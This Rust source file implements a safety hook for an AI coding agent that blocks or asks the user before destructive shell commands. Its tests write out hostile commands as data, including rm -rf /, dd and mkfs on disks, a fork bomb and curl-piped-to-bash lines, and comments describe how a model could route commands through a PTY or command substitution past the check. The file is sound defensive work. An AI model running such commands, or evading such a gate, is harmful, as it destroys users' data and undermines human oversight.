//! Built-in BeforeToolCall hook that blocks dangerous shell invocations.
//!
//! Replaces the binary `yolo_mode` flag with structured pattern matching plus
//! a per-session approval cache. When the cache approves a command, that
//! exact command is allowed for the rest of the session — proving long-lived
//! `Agent` lets stateful handlers carry approvals across turns.
//!
//! Scope of v1: shell commands only. The patterns are hard-coded; user
//! customization will land when there's demand. See Linear YYC-26.

use std::collections::{HashMap, HashSet, VecDeque};

use parking_lot::Mutex;

/// YYC-151: cap on the per-session approval cache. Without this the
/// `approved` set could grow unbounded across a long-running TUI or
/// gateway lane (one entry per distinct dangerous command), letting
/// the user's RAM footprint creep with every approval. 256 is well
/// over any realistic per-session approval count and keeps the FIFO
/// scan cheap. When the cap is reached, the oldest entry is evicted
/// — its usage counter goes too, so the next invocation re-prompts
/// as if the entry had never existed.
const APPROVAL_CACHE_CAP: usize = 256;

use anyhow::Result;
use async_trait::async_trait;
use serde_json::Value;
use tokio::sync::oneshot;
use tokio_util::sync::CancellationToken;

use crate::config::{DangerousCommandPolicy, DangerousCommandsConfig};
use crate::pause::{AgentPause, AgentResume, OptionKind, PauseKind, PauseOption, PauseSender};

use super::{HookHandler, HookOutcome};

pub struct SafetyHook {
    /// FIFO-bounded approval cache (YYC-151). The `HashSet` gives
    /// O(1) membership checks; the `VecDeque` records insertion
    /// order so the oldest entry can be evicted in O(1) when the
    /// cap is reached. Both structures move in lockstep — entries
    /// only land in one if they land in both.
    approved: Mutex<ApprovalCache>,
    /// Per-session usage count keyed by canonical command (YYC-130
    /// follow-up). When the count for an approved command exceeds
    /// `policy.quota_per_session`, the hook re-prompts as if the
    /// approval entry had expired. `0` quota disables the cap.
    usage: Mutex<HashMap<String, u32>>,
    pause_tx: Option<PauseSender>,
    policy: DangerousCommandsConfig,
}

#[derive(Default)]
struct ApprovalCache {
    set: HashSet<String>,
    order: VecDeque<String>,
    cap: usize,
}

impl ApprovalCache {
    fn with_cap(cap: usize) -> Self {
        Self {
            set: HashSet::new(),
            order: VecDeque::new(),
            cap,
        }
    }

    /// Insert `key` into the cache, evicting the oldest entry when
    /// the cap is reached. Returns the evicted key (if any) so the
    /// caller can drop a matching usage counter.
    fn insert(&mut self, key: String) -> Option<String> {
        if self.set.contains(&key) {
            return None;
        }
        let evicted = if self.set.len() >= self.cap {
            self.order.pop_front().inspect(|k| {
                self.set.remove(k);
            })
        } else {
            None
        };
        self.set.insert(key.clone());
        self.order.push_back(key);
        evicted
    }

    fn contains(&self, key: &str) -> bool {
        self.set.contains(key)
    }

    fn remove(&mut self, key: &str) -> bool {
        if !self.set.remove(key) {
            return false;
        }
        if let Some(pos) = self.order.iter().position(|k| k == key) {
            self.order.remove(pos);
        }
        true
    }
}

impl SafetyHook {
    /// Construct without an interactive pause channel. Blocked commands stay
    /// blocked — there's no path back to the user. Suitable for CLI one-shot.
    pub fn new() -> Self {
        Self::with_config(None, DangerousCommandsConfig::default())
    }

    /// Construct with a pause channel. When a dangerous command is matched,
    /// the hook emits an `AgentPause::SafetyApproval` and awaits the user's
    /// response before deciding to block or allow.
    pub fn with_pause_emitter(pause_tx: PauseSender) -> Self {
        Self::with_config(Some(pause_tx), DangerousCommandsConfig::default())
    }

    /// Construct with both a pause channel (or none) and an explicit
    /// policy/quota configuration (YYC-130 follow-up).
    pub fn with_config(pause_tx: Option<PauseSender>, policy: DangerousCommandsConfig) -> Self {
        Self {
            approved: Mutex::new(ApprovalCache::with_cap(APPROVAL_CACHE_CAP)),
            usage: Mutex::new(HashMap::new()),
            pause_tx,
            policy,
        }
    }

    /// Add a command to the per-session approval cache. Future invocations of
    /// the *exact same* command in this session will bypass the safety check.
    /// Public so the TUI can pre-seed approvals if it ever wants to.
    pub fn approve(&self, command: &str) {
        let key = canonical_command_key(command);
        let evicted = self.approved.lock().insert(key);
        // YYC-151: keep usage counters in sync with the approval
        // cache so an evicted command's quota count doesn't linger.
        if let Some(evicted_key) = evicted {
            self.usage.lock().remove(&evicted_key);
        }
    }

    fn is_approved(&self, command: &str) -> bool {
        self.approved
            .lock()
            .contains(&canonical_command_key(command))
    }

    /// Bump the per-session usage counter for `command`. Returns the new
    /// count. The counter is keyed by canonical form so quoting / spacing
    /// variants share one budget.
    fn record_usage(&self, command: &str) -> u32 {
        let key = canonical_command_key(command);
        let mut map = self.usage.lock();
        let entry = map.entry(key).or_insert(0);
        *entry = entry.saturating_add(1);
        *entry
    }

    /// True when the per-session quota is finite and `record_usage` would
    /// push the count past it. Caller advances the counter only after the
    /// command is actually being allowed through, so a re-prompt resets
    /// the counter (via `forget`) without bumping it.
    fn quota_exhausted(&self, command: &str) -> bool {
        let limit = self.policy.quota_per_session;
        if limit == 0 {
            return false;
        }
        let key = canonical_command_key(command);
        self.usage.lock().get(&key).copied().unwrap_or(0) >= limit
    }

    /// Clear the cache + usage counter for `command`. Used after the
    /// quota expires to make the next user prompt feel like a fresh
    /// approval.
    fn forget(&self, command: &str) {
        let key = canonical_command_key(command);
        self.approved.lock().remove(&key);
        self.usage.lock().remove(&key);
    }
}

impl Default for SafetyHook {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl HookHandler for SafetyHook {
    fn name(&self) -> &str {
        "safety-gate"
    }

    fn priority(&self) -> i32 {
        // Run before audit so blocked calls don't appear as "started" in the log.
        // Audit hook is priority 1; we go priority 0.
        0
    }

    async fn before_tool_call(
        &self,
        tool: &str,
        args: &Value,
        cancel: CancellationToken,
    ) -> Result<HookOutcome> {
        // YYC-130: also intercept pty_write so the model can't bypass the
        // bash-tool check by routing the same command through a PTY's
        // stdin. The PTY tool writes raw bytes; if the model is
        // controlling an interactive shell session it can issue arbitrary
        // commands without going through the BashTool path.
        let command = match tool {
            "bash" => match args.get("command").and_then(|v| v.as_str()) {
                Some(c) => c.to_string(),
                None => return Ok(HookOutcome::Continue),
            },
            "pty_write" => match args.get("input").and_then(|v| v.as_str()) {
                Some(input) => {
                    // Treat each newline-terminated line as a candidate
                    // command. Strip the trailing CR/LF for matching but
                    // preserve them in the cache key (the canonical key
                    // path normalizes whitespace).
                    let trimmed = input.trim_end_matches(['\r', '\n']);
                    if trimmed.is_empty() {
                        return Ok(HookOutcome::Continue);
                    }
                    trimmed.to_string()
                }
                None => return Ok(HookOutcome::Continue),
            },
            _ => return Ok(HookOutcome::Continue),
        };
        let command = command.as_str();

        let reason = match match_dangerous(command) {
            Some(r) => r,
            None => return Ok(HookOutcome::Continue),
        };

        // YYC-130 follow-up: policy lets users opt out of prompting.
        // `Allow` lets every dangerous match through (still warn-logged
        // so it shows up in the audit trail). `Block` short-circuits
        // before the approval cache so even remembered commands stop.
        match self.policy.policy {
            DangerousCommandPolicy::Allow => {
                tracing::warn!(
                    "safety-gate: dangerous_commands.policy = allow — letting '{command}' run ({reason})"
                );
                return Ok(HookOutcome::Continue);
            }
            DangerousCommandPolicy::Block => {
                tracing::warn!(
                    "safety-gate: dangerous_commands.policy = block — '{command}' rejected ({reason})"
                );
                return Ok(HookOutcome::Block {
                    reason: format!(
                        "{reason} (config policy = block — ask the user to flip dangerous_commands.policy if this is intentional)"
                    ),
                });
            }
            DangerousCommandPolicy::Prompt => {}
        }

        if self.is_approved(command) {
            // YYC-130 follow-up: per-session quota. Once the
            // approved-and-remembered cache entry has been used past the
            // configured cap, drop it and fall through to a fresh
            // prompt. quota = 0 disables the cap entirely (legacy
            // behavior).
            if self.quota_exhausted(command) {
                tracing::info!(
                    "safety-gate: quota exhausted for '{command}' (limit {}); re-prompting",
                    self.policy.quota_per_session,
                );
                self.forget(command);
            } else {
                let count = self.record_usage(command);
                tracing::info!(
                    "safety-gate: '{command}' approved earlier this session, allowing (use {count})"
                );
                return Ok(HookOutcome::Continue);
            }
        }

        // If a pause emitter is wired up, ask the user. Otherwise fall back to
        // a hard block (CLI one-shot path).
        if let Some(tx) = &self.pause_tx {
            let (reply_tx, reply_rx) = oneshot::channel();
            let pause = AgentPause {
                kind: PauseKind::SafetyApproval {
                    tool: tool.to_string(),
                    command: command.to_string(),
                    reason: reason.to_string(),
                },
                reply: reply_tx,
                // YYC-59: surface inline pills so the TUI can render
                // semantic action buttons. Falls back to the legacy
                // a/r/d modal automatically if a future caller leaves
                // this empty.
                options: vec![
                    PauseOption {
                        key: 'y',
                        label: "allow".into(),
                        kind: OptionKind::Primary,
                        resume: AgentResume::Allow,
                    },
                    PauseOption {
                        key: 'r',
                        label: "remember".into(),
                        kind: OptionKind::Neutral,
                        resume: AgentResume::AllowAndRemember,
                    },
                    PauseOption {
                        key: 'n',
                        label: "deny".into(),
                        kind: OptionKind::Destructive,
                        resume: AgentResume::Deny,
                    },
                ],
            };

            if tx.send(pause).await.is_err() {
                // Consumer is gone. Fall back to block.
                tracing::warn!("safety-gate: pause consumer dropped, falling back to block");
                return Ok(HookOutcome::Block {
                    reason: format!("{reason} (no approval consumer available)"),
                });
            }

            let resume = tokio::select! {
                biased;
                _ = cancel.cancelled() => {
                    return Ok(HookOutcome::Block {
                        reason: "Cancelled while awaiting approval".to_string(),
                    });
                }
                r = reply_rx => r,
            };

            return Ok(match resume {
                Ok(AgentResume::Allow) => HookOutcome::Continue,
                Ok(AgentResume::AllowAndRemember) => {
                    self.approve(command);
                    HookOutcome::Continue
                }
                Ok(AgentResume::Deny) => HookOutcome::Block {
                    reason: format!("{reason} (user denied)"),
                },
                Ok(AgentResume::DenyWithReason(r)) => HookOutcome::Block { reason: r },
                // YYC-81 added Custom — meaningless to a safety hook;
                // treat as a deny.
                Ok(AgentResume::Custom(_)) => HookOutcome::Block {
                    reason: format!("{reason} (custom response on safety prompt — denying)"),
                },
                // YYC-75: AcceptHunks is meaningless here; treat as deny.
                Ok(AgentResume::AcceptHunks(_)) => HookOutcome::Block {
                    reason: format!("{reason} (hunk-accept on safety prompt — denying)"),
                },
                Err(_) => HookOutcome::Block {
                    reason: format!("{reason} (approval channel closed)"),
                },
            });
        }

        tracing::warn!("safety-gate blocked bash command: {reason} ({command})");
        Ok(HookOutcome::Block {
            reason: format!("{reason}. If you really need this, ask the user to approve."),
        })
    }
}

/// Returns the human-readable block reason for known-dangerous shell patterns,
/// or `None` if the command looks fine.
///
/// YYC-114: tokenizes the command (handling quotes + sudo/doas/env prefixes)
/// and applies structured rules instead of literal substring matching, so
/// `rm --recursive --force /`, `rm -rf "/"`, and `sudo rm -rf $HOME` are all
/// caught.
fn match_dangerous(command: &str) -> Option<&'static str> {
    let raw_tokens = shell_tokenize(command);
    if raw_tokens.is_empty() {
        // Fallback to substring-only rules for single-quoted oddities.
        return generic_substring_rules(command);
    }

    for segment in command_segments(&raw_tokens) {
        let tokens = strip_command_prefixes(segment);
        if let Some(reason) = match_dangerous_tokens(&tokens) {
            return Some(reason);
        }
        // YYC-195: command substitution / process substitution in
        // a segment that runs a destructive verb evades token
        // checks because the inner expansion isn't visible at
        // match time. Conservatively flag it.
        if let Some(reason) = match_substitution_in_segment(&tokens) {
            return Some(reason);
        }
    }

    // Cross-cutting rules that don't depend on the head verb.
    if command.contains(":(){") {
        return Some("possible fork bomb pattern");
    }

    if (command.contains("curl") || command.contains("wget")) && pipes_to_shell(command) {
        return Some("pipe-to-shell from network (curl|bash / wget|sh)");
    }

    None
}

/// YYC-195: when the segment's head verb is destructive
/// (`rm`/`dd`/`mkfs*`/`chmod`), any argument containing shell
/// command substitution or process substitution (`$(...)`,
/// backticks, `<(...)`, `>(...)`) is flagged. The inner expansion
/// could resolve to anything; refusing without inspection is
/// safer than guessing the runtime expansion.
fn match_substitution_in_segment(tokens: &[String]) -> Option<&'static str> {
    if tokens.is_empty() {
        return None;
    }
    let head = tokens[0].as_str();
    let destructive = head == "rm"
        || head == "dd"
        || head == "mkfs"
        || head.starts_with("mkfs.")
        || head == "chmod"
        || head == "chown";
    if !destructive {
        return None;
    }
    if tokens
        .iter()
        .skip(1)
        .any(|t| token_contains_substitution(t))
    {
        return Some("command substitution in destructive command");
    }
    None
}

/// YYC-195: detect `$(`, backtick, `<(`, `>(` inside a single
/// token. The shell tokenizer drops single-quote chars but keeps
/// the contents, so a single-quoted `$(foo)` would survive here
/// — that's the conservative direction (over-flag rather than
/// under).
fn token_contains_substitution(token: &str) -> bool {
    token.contains("$(") || token.contains('`') || token.contains("<(") || token.contains(">(")
}

fn match_dangerous_tokens(tokens: &[String]) -> Option<&'static str> {
    if tokens.is_empty() {
        return None;
    }
    let head = tokens[0].as_str();

    match head {
        "rm" => {
            let recursive = has_short_or_long(tokens, &['r', 'R'], &["--recursive"]);
            let force = has_short_or_long(tokens, &['f'], &["--force"]);
            if recursive && force && has_dangerous_rm_target(tokens) {
                return Some("destructive recursive remove of root or home directory");
            }
        }
        "dd" => return Some("low-level disk operation (dd)"),
        h if h == "mkfs" || h.starts_with("mkfs.") => {
            return Some("filesystem format command (mkfs)");
        }
        "chmod" => {
            let recursive = has_short_or_long(tokens, &['R'], &["--recursive"]);
            let permissive = tokens.iter().any(|t| t == "777");
            let on_root = tokens
                .iter()
                .skip(2)
                .any(|t| t == "/" || t == "/*" || t == "/etc" || t == "/usr");
            if permissive && (recursive || on_root) {
                return Some("overly permissive recursive chmod 777");
            }
        }
        "git" => {
            // Match `git push` (with optional flags before `push`).
            if tokens.iter().skip(1).any(|t| t == "push") {
                let has_force = tokens.iter().any(|t| {
                    t == "--force"
                        || t == "-f"
                        || (t.starts_with('-') && !t.starts_with("--") && t.contains('f'))
                });
                let has_lease = tokens
                    .iter()
                    .any(|t| t == "--force-with-lease" || t.starts_with("--force-with-lease="));
                if has_force && !has_lease {
                    return Some("force push (consider --force-with-lease)");
                }
            }
        }
        _ => {}
    }

    None
}

/// Canonical key for the per-session approval cache (YYC-130).
///
/// Tokenizes the command and joins with single spaces so semantically
/// equivalent variants — extra whitespace, equivalent quoting, mixed
/// space/tab — collapse to the same key. Variants that change *meaning*
/// (sudo prefix, different target path, different flag values) keep
/// distinct keys so an approval for one doesn't silently authorize the
/// other.
///
/// Pipeline / sequence operators are preserved as their own tokens so
/// approving `cd /tmp` doesn't authorize `cd /tmp && rm -rf /`.
fn canonical_command_key(command: &str) -> String {
    let tokens = shell_tokenize(command);
    if tokens.is_empty() {
        return command.trim().to_string();
    }
    tokens.join(" ")
}

/// Minimal shell tokenizer — handles single + double quotes, backslash escapes,
/// and whitespace splitting. Drops quote characters from token output.
fn shell_tokenize(input: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut chars = input.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;
    while let Some(ch) = chars.next() {
        if !in_single && ch == '\\' {
            if let Some(next) = chars.next() {
                current.push(next);
            }
            continue;
        }
        if !in_double && ch == '\'' {
            in_single = !in_single;
            continue;
        }
        if !in_single && ch == '"' {
            in_double = !in_double;
            continue;
        }
        if !in_single && !in_double && ch.is_whitespace() {
            if !current.is_empty() {
                out.push(std::mem::take(&mut current));
            }
            continue;
        }
        if !in_single && !in_double {
            match ch {
                ';' => {
                    if !current.is_empty() {
                        out.push(std::mem::take(&mut current));
                    }
                    out.push(";".to_string());
                    continue;
                }
                '&' if chars.peek() == Some(&'&') => {
                    chars.next();
                    if !current.is_empty() {
                        out.push(std::mem::take(&mut current));
                    }
                    out.push("&&".to_string());
                    continue;
                }
                '|' if chars.peek() == Some(&'|') => {
                    chars.next();
                    if !current.is_empty() {
                        out.push(std::mem::take(&mut current));
                    }
                    out.push("||".to_string());
                    continue;
                }
                '|' => {
                    if !current.is_empty() {
                        out.push(std::mem::take(&mut current));
                    }
                    out.push("|".to_string());
                    continue;
                }
                _ => {}
            }
        }
        current.push(ch);
    }
    if !current.is_empty() {
        out.push(current);
    }
    out
}

fn command_segments(tokens: &[String]) -> Vec<Vec<String>> {
    let mut segments = Vec::new();
    let mut current = Vec::new();
    for token in tokens {
        if matches!(token.as_str(), ";" | "&&" | "||" | "|") {
            if !current.is_empty() {
                segments.push(std::mem::take(&mut current));
            }
            continue;
        }
        current.push(token.clone());
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}

/// Strip leading `sudo`, `doas`, `env`, `command`, and `KEY=VAL` prefix tokens.
fn strip_command_prefixes(mut tokens: Vec<String>) -> Vec<String> {
    while let Some(first) = tokens.first() {
        match first.as_str() {
            "sudo" | "doas" => {
                tokens.remove(0);
                strip_wrapper_options(&mut tokens);
            }
            "env" => {
                tokens.remove(0);
                strip_wrapper_options(&mut tokens);
                while tokens
                    .first()
                    .map(|t| is_env_assignment(t))
                    .unwrap_or(false)
                {
                    tokens.remove(0);
                }
            }
            "command" => {
                tokens.remove(0);
            }
            "--" => {
                tokens.remove(0);
            }
            _ if is_env_assignment(first) => {
                tokens.remove(0);
            }
            _ => break,
        }
    }
    tokens
}

fn strip_wrapper_options(tokens: &mut Vec<String>) {
    while let Some(first) = tokens.first() {
        if first == "--" {
            tokens.remove(0);
            break;
        }
        if !first.starts_with('-') || first == "-" {
            break;
        }
        let takes_value = matches!(
            first.as_str(),
            "-u" | "--user"
                | "-g"
                | "--group"
                | "-h"
                | "--host"
                | "-C"
                | "--chdir"
                | "-S"
                | "--split-string"
        );
        tokens.remove(0);
        if takes_value && tokens.first().is_some_and(|t| !t.starts_with('-')) {
            tokens.remove(0);
        }
    }
}

fn is_env_assignment(token: &str) -> bool {
    token.contains('=')
        && !token.starts_with('-')
        && token
            .chars()
            .next()
            .map(|c| c.is_ascii_alphabetic() || c == '_')
            .unwrap_or(false)
}

/// True if any token is a long flag in `longs` or a short-flag bundle
/// containing one of `shorts`.
fn has_short_or_long(tokens: &[String], shorts: &[char], longs: &[&str]) -> bool {
    tokens.iter().any(|t| {
        if longs.iter().any(|l| t == l) {
            return true;
        }
        if t.starts_with("--") {
            return false;
        }
        if t.starts_with('-') && t.len() > 1 {
            return t.chars().skip(1).any(|c| shorts.contains(&c));
        }
        false
    })
}

/// True if any non-flag arg after `rm` resolves to root, $HOME, or `~`.
///
/// YYC-195 ordering: home-path exemption runs BEFORE the generic
/// `/home` prefix check so `/home/<user>/scratch` (i.e. an
/// expanded `$HOME/scratch`) stays allowed, matching the
/// semantically-equivalent `~/scratch` and `$HOME/scratch` paths.
fn has_dangerous_rm_target(tokens: &[String]) -> bool {
    has_dangerous_rm_target_with_home(tokens, std::env::var("HOME").ok().as_deref())
}

fn has_dangerous_rm_target_with_home(tokens: &[String], home: Option<&str>) -> bool {
    let home = home.map(str::to_string);
    tokens.iter().skip(1).any(|t| {
        if t.starts_with('-') {
            return false;
        }
        let trimmed = t.as_str();
        if trimmed == "/"
            || trimmed == "/*"
            || trimmed == "$HOME"
            || trimmed == "${HOME}"
            || trimmed == "~"
        {
            return true;
        }
        if trimmed.strip_prefix("~/").is_some() {
            // ~/foo is fine — exact `~` already handled above.
            return false;
        }
        // YYC-195: $HOME *subdir* exemption must run BEFORE the
        // generic `/home` prefix block so `/home/<user>/scratch`
        // (the expanded form of `$HOME/scratch`) stays allowed.
        // Bare home (`==h`) is still dangerous — falls through to
        // the prefix block below.
        if let Some(h) = &home
            && trimmed.starts_with(&format!("{h}/"))
        {
            return false; // home subdir = ok
        }
        if trimmed.starts_with("/home")
            || trimmed.starts_with("/usr")
            || trimmed.starts_with("/etc")
        {
            return true;
        }
        false
    })
}

fn pipes_to_shell(command: &str) -> bool {
    // YYC-195: expanded shell + adapter list. Pipe-aware
    // tokenization is overkill for the metas we care about (they
    // don't survive quoting). Match `| <name>` and `|<name>` with
    // optional whitespace; trailing-end variant catches a
    // `command | sh` with no following args.
    const SHELL_TOKENS: &[&str] = &[
        "bash", "sh", "zsh", "dash", "ksh", "fish", "ash", "busybox", "env", "xargs",
    ];
    for shell in SHELL_TOKENS {
        // `| <shell>` and `|<shell> ` and `|<shell>` end-of-string.
        let with_space = format!("| {shell}");
        let no_space = format!("|{shell}");
        let no_space_followed = format!("|{shell} ");
        if command.contains(&with_space)
            || command.contains(&no_space_followed)
            || command.ends_with(&no_space)
            || command.contains(&format!("| {shell} "))
        {
            return true;
        }
    }
    false
}

/// Rules that don't need tokenization. Hit when the tokenizer returns an
/// empty list (e.g. only quoted whitespace).
fn generic_substring_rules(command: &str) -> Option<&'static str> {
    if command.contains(":(){") {
        return Some("possible fork bomb pattern");
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // YYC-151: the FIFO approval cache must drop the oldest entry
    // once the cap is hit so a long-running session doesn't grow
    // unbounded. Inserts CAP+1 distinct commands and asserts the
    // first one is no longer approved while the latest still is.
    #[test]
    fn approval_cache_evicts_oldest_when_cap_exceeded() {
        let hook = SafetyHook::new();
        for i in 0..APPROVAL_CACHE_CAP {
            hook.approve(&format!("approved_cmd_{i}"));
        }
        assert!(hook.is_approved("approved_cmd_0"));
        // One more push past the cap evicts the FIFO head.
        hook.approve("approved_cmd_overflow");
        assert!(
            !hook.is_approved("approved_cmd_0"),
            "oldest approval should have been evicted past the cap",
        );
        assert!(hook.is_approved("approved_cmd_overflow"));
        assert!(hook.is_approved(&format!("approved_cmd_{}", APPROVAL_CACHE_CAP - 1)));
    }

    // YYC-151: an approved command stays approved up to the moment
    // it gets evicted; this guards against a regression where the
    // cache loses entries before the cap is reached.
    #[test]
    fn approval_cache_keeps_entries_until_cap_reached() {
        let hook = SafetyHook::new();
        for i in 0..APPROVAL_CACHE_CAP {
            hook.approve(&format!("cmd_{i}"));
        }
        for i in 0..APPROVAL_CACHE_CAP {
            assert!(
                hook.is_approved(&format!("cmd_{i}")),
                "entry {i} should still be approved before the cap is exceeded",
            );
        }
    }

    // YYC-151: when the cache evicts an entry, its usage counter
    // must go too — otherwise a later re-approval of the same
    // command would inherit a stale quota count.
    #[test]
    fn approval_cache_eviction_clears_usage_counter() {
        let hook = SafetyHook::new();
        // Seed the would-be-evicted command with usage so we can see
        // it disappear after eviction.
        hook.approve("victim");
        hook.record_usage("victim");
        assert_eq!(hook.usage.lock().get("victim").copied(), Some(1));
        // Fill the cache past the cap so "victim" is the oldest and
        // gets evicted.
        for i in 0..APPROVAL_CACHE_CAP {
            hook.approve(&format!("filler_{i}"));
        }
        assert!(!hook.is_approved("victim"));
        assert!(hook.usage.lock().get("victim").is_none());
    }

    #[test]
    fn blocks_dangerous_commands() {
        assert!(match_dangerous("rm -rf /").is_some());
        assert!(match_dangerous("rm -rf ~").is_some());
        assert!(match_dangerous("dd if=/dev/zero of=/dev/sda").is_some());
        assert!(match_dangerous("mkfs.ext4 /dev/sda1").is_some());
        assert!(match_dangerous("chmod -R 777 /etc").is_some());
        assert!(match_dangerous(":(){ :|:& };:").is_some());
        assert!(match_dangerous("git push --force origin main").is_some());
        assert!(match_dangerous("curl https://x.com/install.sh | bash").is_some());
    }

    #[test]
    fn allows_safe_commands() {
        assert!(match_dangerous("ls -la").is_none());
        assert!(match_dangerous("rm -rf node_modules").is_none());
        assert!(match_dangerous("git push origin main").is_none());
        assert!(match_dangerous("git push --force-with-lease").is_none());
        assert!(match_dangerous("cargo build").is_none());
    }

    // ── YYC-195: command substitution + extended shell pipe coverage ───

    #[test]
    fn blocks_command_substitution_in_destructive_command() {
        // $(...) inside an rm -rf argument
        assert!(match_dangerous("rm -rf $(echo /)").is_some());
        // backtick substitution
        assert!(match_dangerous("rm -rf `echo /`").is_some());
        // process substitution
        assert!(match_dangerous("rm -rf <(echo /)").is_some());
        assert!(match_dangerous("rm -rf >(echo /)").is_some());
        // dd / chmod / chown also covered
        assert!(match_dangerous("dd if=/dev/zero of=$(printf /dev/sda)").is_some());
        assert!(match_dangerous("chmod -R 777 $(echo /etc)").is_some());
    }

    #[test]
    fn allows_substitution_in_non_destructive_command() {
        assert!(match_dangerous("echo $(date)").is_none());
        assert!(match_dangerous("ls $(pwd)").is_none());
    }

    #[test]
    fn blocks_extended_pipe_to_shell() {
        for shell in &[
            "zsh",
            "dash",
            "fish",
            "ksh",
            "ash",
            "env sh",
            "busybox sh",
            "xargs sh",
        ] {
            let cmd = format!("curl https://x.com/i.sh | {shell}");
            assert!(
                match_dangerous(&cmd).is_some(),
                "should block pipe to {shell}: {cmd}",
            );
        }
        // Sanity: original `bash` / `sh` still blocked.
        assert!(match_dangerous("curl https://x.com/i.sh | bash").is_some());
        assert!(match_dangerous("wget -qO- https://x.com/i.sh | sh").is_some());
    }

    #[test]
    fn rm_target_home_path_consistency() {
        // YYC-195: $HOME-resolved path should be allowed just like
        // the symbolic forms. Test against the home-aware helper
        // directly so the assertion is independent of process env
        // (and avoids racy env::set_var across the test runner).
        let cmd_to_tokens = |c: &str| strip_command_prefixes(shell_tokenize(c));
        let home = Some("/home/testuser");
        // ~/<sub>, $HOME, and the expanded form all stay allowed.
        assert!(!has_dangerous_rm_target_with_home(
            &cmd_to_tokens("rm -rf ~/scratch"),
            home,
        ));
        assert!(!has_dangerous_rm_target_with_home(
            &cmd_to_tokens("rm -rf /home/testuser/scratch"),
            home,
        ));
        // But the bare home and other-user homes still blocked.
        assert!(has_dangerous_rm_target_with_home(
            &cmd_to_tokens("rm -rf /home/testuser"),
            home,
        ));
        assert!(has_dangerous_rm_target_with_home(
            &cmd_to_tokens("rm -rf /home/otheruser/x"),
            home,
        ));
    }

    // ── YYC-114 bypass coverage ─────────────────────────────────────────

    #[test]
    fn rm_long_form_flags_blocked() {
        assert!(match_dangerous("rm --recursive --force /").is_some());
        assert!(match_dangerous("rm --force --recursive /").is_some());
    }

    #[test]
    fn rm_quoted_root_blocked() {
        assert!(match_dangerous("rm -rf \"/\"").is_some());
        assert!(match_dangerous("rm -rf '/'").is_some());
    }

    #[test]
    fn rm_quoted_home_blocked() {
        assert!(match_dangerous("rm -rf \"$HOME\"").is_some());
        assert!(match_dangerous("rm -rf '${HOME}'").is_some());
    }

    #[test]
    fn rm_with_sudo_prefix_blocked() {
        assert!(match_dangerous("sudo rm -rf /").is_some());
        assert!(match_dangerous("sudo  rm  -rf  ~").is_some());
        assert!(match_dangerous("doas rm -rf /etc").is_some());
    }

    #[test]
    fn rm_with_env_prefix_blocked() {
        assert!(match_dangerous("HOME=/tmp rm -rf /").is_some());
        assert!(match_dangerous("env FOO=bar rm -rf /").is_some());
    }

    #[test]
    fn rm_with_privilege_or_env_prefix_flags_blocked() {
        assert!(match_dangerous("sudo -n rm -rf /").is_some());
        assert!(match_dangerous("sudo -- rm -rf /").is_some());
        assert!(match_dangerous("env -i HOME=/tmp rm -rf /").is_some());
    }

    #[test]
    fn dangerous_command_in_shell_sequence_blocked() {
        assert!(match_dangerous("cd /tmp && rm -rf /").is_some());
        assert!(match_dangerous("echo ok; sudo rm -rf /etc").is_some());
    }

    #[test]
    fn rm_split_short_flags_blocked() {
        assert!(match_dangerous("rm -r -f /").is_some());
        assert!(match_dangerous("rm -fr /").is_some());
    }

    #[test]
    fn rm_safe_subdir_passes() {
        assert!(match_dangerous("rm -rf ./node_modules").is_none());
        assert!(match_dangerous("rm -rf ~/scratch").is_none());
        assert!(match_dangerous("sudo rm -rf /tmp/build-cache").is_none());
    }

    #[test]
    fn dd_quoted_paths_blocked() {
        assert!(match_dangerous("dd if=\"/dev/zero\" of=\"/dev/sda\"").is_some());
    }

    #[test]
    fn mkfs_variants_blocked() {
        assert!(match_dangerous("mkfs.ext4 /dev/sda1").is_some());
        assert!(match_dangerous("mkfs.btrfs /dev/sdb1").is_some());
        assert!(match_dangerous("sudo mkfs.xfs /dev/sdc").is_some());
    }

    #[test]
    fn chmod_777_recursive_blocked() {
        assert!(match_dangerous("chmod -R 777 /").is_some());
        assert!(match_dangerous("chmod --recursive 777 /var").is_some());
    }

    #[test]
    fn chmod_777_root_blocked() {
        assert!(match_dangerous("chmod 777 /").is_some());
    }

    #[test]
    fn git_force_short_flag_blocked() {
        assert!(match_dangerous("git push -f origin main").is_some());
        assert!(match_dangerous("git push --force origin main").is_some());
    }

    #[test]
    fn git_force_with_lease_passes() {
        assert!(match_dangerous("git push --force-with-lease").is_none());
        assert!(match_dangerous("git push --force-with-lease=origin/main").is_none());
    }

    #[tokio::test]
    async fn pause_path_routes_through_emitter() {
        use crate::pause::{AgentResume, PauseKind};

        let (tx, mut rx) = crate::pause::channel(4);
        let hook = SafetyHook::with_pause_emitter(tx);
        let dangerous = "rm -rf /";
        let args = serde_json::json!({ "command": dangerous });
        let cancel = CancellationToken::new();

        // Start the hook call in a background task — it will block awaiting
        // the user's response on the oneshot reply channel.
        let hook_arc = std::sync::Arc::new(hook);
        let h = hook_arc.clone();
        let c = cancel.clone();
        let task = tokio::spawn(async move { h.before_tool_call("bash", &args, c).await });

        // Simulate the TUI consuming the pause and sending AllowAndRemember.
        let pause = rx.recv().await.expect("pause should arrive");
        match &pause.kind {
            PauseKind::SafetyApproval { command, .. } => assert_eq!(command, dangerous),
            other => panic!("expected SafetyApproval, got {other:?}"),
        }
        pause
            .reply
            .send(AgentResume::AllowAndRemember)
            .expect("reply ok");

        // Hook should now resolve to Continue.
        let outcome = task.await.expect("task ok").expect("hook ok");
        assert!(matches!(outcome, HookOutcome::Continue));

        // And the command should now be in the approval cache.
        assert!(hook_arc.is_approved(dangerous));
    }

    #[tokio::test]
    async fn safety_pause_carries_inline_pill_options() {
        // YYC-59: safety hook should populate the y/r/n option set so the
        // TUI can render inline pills + key-dispatch the choice.
        let (tx, mut rx) = crate::pause::channel(4);
        let hook = SafetyHook::with_pause_emitter(tx);
        let dangerous = "rm -rf /";
        let args = serde_json::json!({ "command": dangerous });
        let cancel = CancellationToken::new();

        let hook_arc = std::sync::Arc::new(hook);
        let h = hook_arc.clone();
        let c = cancel.clone();
        let task = tokio::spawn(async move { h.before_tool_call("bash", &args, c).await });

        let pause = rx.recv().await.expect("pause should arrive");
        let keys: Vec<char> = pause.options.iter().map(|o| o.key).collect();
        assert_eq!(keys, vec!['y', 'r', 'n']);
        assert!(
            pause
                .options
                .iter()
